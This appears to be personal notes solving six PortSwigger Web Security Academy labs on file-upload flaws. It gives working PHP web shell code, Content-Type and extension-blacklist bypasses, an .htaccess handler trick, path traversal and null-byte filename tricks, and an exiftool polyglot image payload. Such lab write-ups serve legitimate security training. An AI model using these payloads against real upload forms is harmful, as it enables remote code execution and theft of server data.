# File upload 



### Table of Contents

- [Remote code execution via web shell upload](#remote-code-execution-via-web-shell-upload)
- [Web shell upload via Content-Type restriction bypass](#web-shell-upload-via-content-type-restriction-bypass)
- [Web shell upload via path traversal](#web-shell-upload-via-path-traversal)
- [Web shell upload via extension blacklist bypass](#web-shell-upload-via-extension-blacklist-bypass)
- [Web shell upload via obfuscated file extension](#web-shell-upload-via-obfuscated-file-extension)
- [Remote code execution via polyglot web shell upload](#remote-code-execution-via-polyglot-web-shell-upload)



----





### [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

Goal : upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`

- login with your credentials `wiener : peter`

- write a simple php code to view the content of `/home/carlos/secret`
  ```php
  <?php
  echo shell_exec('cat /home/carlos/secret');
  ?>
  ```

- upload the file

- from burp make the `Content-Type` header as a `text/html` 
  >to view all different extensions and equivalent value of Content-type header : [Content-Type](https://www.php.net/manual/en/function.mime-content-type.php#87856)



<img src=".\file_upload_img\1_2.png" style="zoom:80%;" />



- you will get the path of the file `The file avatars/code.php has been uploaded. `
- go to the file path and you will see the secret text

![](C:\Users\dell\Desktop\file_upload_img\1_1.png)







------





### [Web shell upload via Content-Type restriction bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)

Goal : upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`

- login with your credentials `wiener : peter`

- if you try to upload the previous php file you will get 
  ```
  Sorry, file type application/octet-stream is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
  ```

- I changed the `Content-Type` header to  `image/png` and sent the request

  

  <img src=".\file_upload_img\2_1.png" style="zoom:80%;" />

  

- you will get the path of the file `The file avatars/code.php has been uploaded. `
- go to the file path and you will see the secret text



------





### [Web shell upload via path traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)

Goal : upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`
- login with your credentials `wiener : peter`
- if you try to upload the previous php file you will get `The file avatars/code.php has been uploaded.`
- go to the file path
- notice that the page is blank and the code doesn't executed , it's just exists as a plain text
- In the `Content-Disposition` header, change the `filename` to `../code.php`
- notice that the file has been uploaded to `/files/code.php` NOT `/files/avatars/code.php` , so the filename parameter is vulnerable to path traversal
- the server performs URL decoding to the file name , So send the same request but encode the `/` with URL encoding (`%2f`) , you will get `The file avatars/../code.php has been uploaded`

<img src=".\file_upload_img\3_1.png" style="zoom:80%;" />



- go to `/files/avatars/..%2fcode.php` and you will see the secret text





------





### [Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

Goal : upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`

- login with your credentials `wiener : peter`

- if you try to upload the previous php file you will get `Sorry, php files are not allowed Sorry, there was an error uploading your file.`

- the extension `php` is blocked so i tried other php extensions to bypass the blacklisted extension

- from burp intruder i loaded these extensions and the file uploaded successfully but it was as a plain text
  >for more extensions and bypasses : [file upload bypass](https://book.hacktricks.xyz/pentesting-web/file-upload) 

  ```
  .php2
  .php3
  .php4
  .php5
  .php6
  .php7
  ```

- we need to tell the server to execute any extension we add as a `php`code , so we will add our `.htaccess` file

- change filename to `.htaccess` with `Content-Type : html/plain` and content : 
  ```
  AddType application/x-httpd-php .php0
  ```

- now any file with `php0` extension will be executed as a `php` code

<img src=".\file_upload_img\4_1.png" style="zoom:80%;" />



- back to the previous request , change the filename to `code.php0` and send the request



<img src=".\file_upload_img\4_2.png" style="zoom:80%;" />



- you will get the path of the file `The file avatars/code.php0 has been uploaded. `
- go to the file path and you will see the secret text





------





### [Web shell upload via obfuscated file extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)

Goal : upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`

- login with your credentials `wiener : peter`

- if you try to upload the previous php file you will get `Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.`

- the extension `php` is blocked so I tried URL-encoded null byte characters (`%00`) before the file extension 



<img src=".\file_upload_img\5_1.png" style="zoom:80%;" />





- you will get the path of the file `The file avatars/code.php has been uploaded. `
- go to the file path and you will see the secret text

<img src="C:\Users\dell\Desktop\file_upload_img\5_2.png" style="zoom:80%;" />





------





### [Remote code execution via polyglot web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)

Goal : upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

- go to `my account`

- login with your credentials `wiener : peter`

- if you try to upload the previous php file you will get `Error: file is not a valid image Sorry, there was an error uploading your file.`

- I tried URL-encoded null byte characters (`%00`) before the file extension  , but I got the same message

- we need to inject our php code in any image , so we will use `exiftool` to do that
  ```bash
  exiftool -Comment="<?php echo 'Carlos Secret' . shell_exec('cat /home/carlos/secret'); ?>"  -o code.php
  ```

- this command will add this comment to the image metadata



<img src=".\file_upload_img\6_1.png" style="zoom:80%;" />



- upload the image 

<img src=".\file_upload_img\6_2.png" style="zoom:80%;" />



- go to your image path `/files/avatars/code.php` , you will get the secret text in the response



<img src=".\file_upload_img\6_3.png" style="zoom:80%;" />



